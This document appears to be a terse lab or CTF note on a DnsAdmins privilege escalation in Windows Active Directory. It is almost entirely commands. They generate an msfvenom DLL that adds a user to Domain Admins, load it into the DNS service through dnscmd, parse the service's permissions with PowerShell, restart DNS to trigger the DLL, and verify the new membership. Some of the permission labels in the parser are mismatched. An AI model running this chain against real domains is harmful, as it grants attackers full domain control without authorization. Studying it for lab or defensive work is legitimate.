# Generating Malicious DLL
```powershell
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

# Loading DLL as Non-Privileged User
```powershell
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

# Finding User's SID
```powershell
(Get-ADUser -Identity "netadm").SID.Value
```

# Checking Permissions on DNS Service
```powershell
sc.exe sdshow DNS


# Input SDDL string from your prompt
$sddl = "D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)"
# Service Rights Dictionary
$rightsDict = @{
    "CC" = "Read Service Configuration (SERVICE_QUERY_CONFIG)"
    "LC" = "Query Service Status (SERVICE_QUERY_STATUS)"
    "SW" = "Enumerate Service Dependencies (SERVICE_ENUMERATE_DEPENDENTS)"
    "LO" = "Interrogate Service Logs (SERVICE_INTERROGATE)"
    "CR" = "Query User-Defined Controls (SERVICE_USER_DEFINED_CONTROL)"
    "RC" = "Read Security Descriptor (READ_CONTROL)"
    "RP" = "START the Service (SERVICE_START)"
    "WP" = "STOP the Service (SERVICE_STOP)"
    "DT" = "Pause/Continue the Service (SERVICE_PAUSE_CONTINUE)"
    "DC" = "Change Service Configuration (SERVICE_CHANGE_CONFIG)"
    "WD" = "Change Owner (WRITE_OWNER)"
    "WO" = "Modify Permissions / DACL (WRITE_DAC)"
    "SD" = "Delete the Service (DELETE)"
}

# Standard Trustee/Principal Dictionary
$trusteesDict = @{
    "IU" = "Interactive Users (Users logged into the machine)"
    "SU" = "Service Users (Accounts running background services)"
    "SY" = "Local System (NT AUTHORITY\SYSTEM)"
    "BA" = "Built-in Administrators"
    "SO" = "Server Operators"
}

# Extract individual Access Control Entries (ACE)
$aces = $sddl -split '\)' | ForEach-Object { $_.TrimStart('D:').TrimStart('(') } | Where-Object { $_ -ne "" }

Write-Host "================== DNS SERVICE PERMISSIONS ==================" -ForegroundColor Cyan

foreach ($ace in $aces) {
    $parts = $ace -split ';'
    if ($parts.Count -ge 6) {
        $type = $parts[0] # A = Allow
        $rightsRaw = $parts[2]
        $trusteeRaw = $parts[5]

        # Resolve Trustee (User/Group)
        if ($trusteesDict.ContainsKey($trusteeRaw)) {
            $trustee = $trusteesDict[$trusteeRaw]
        } else {
            $trustee = "Specific SID / User Account ($trusteeRaw)"
        }

        Write-Host "`nTarget: $trustee" -ForegroundColor Yellow
        Write-Host "Action: " -NoNewline; Write-Host "ALLOW" -ForegroundColor Green

        # Parse Rights (2 characters each)
        Write-Host "Rights Granted:"
        for ($i = 0; $i -lt $rightsRaw.Length; $i += 2) {
            $right = $rightsRaw.Substring($i, 2)
            if ($rightsDict.ContainsKey($right)) {
                Write-Host "  - $($rightsDict[$right])" -ForegroundColor Gray
            } else {
                Write-Host "  - Unknown Permission ($right)" -ForegroundColor Red
            }
        }
    }
}
Write-Host "`n===========================================================" -ForegroundColor Cyan
```

# Stopping the DNS Service
```powershell
Stop-Service -Name "DNS" -Force
Start-Service -Name "DNS"
```

# Confirming Group Membership
```powershell
net group "Domain Admins" /dom
```
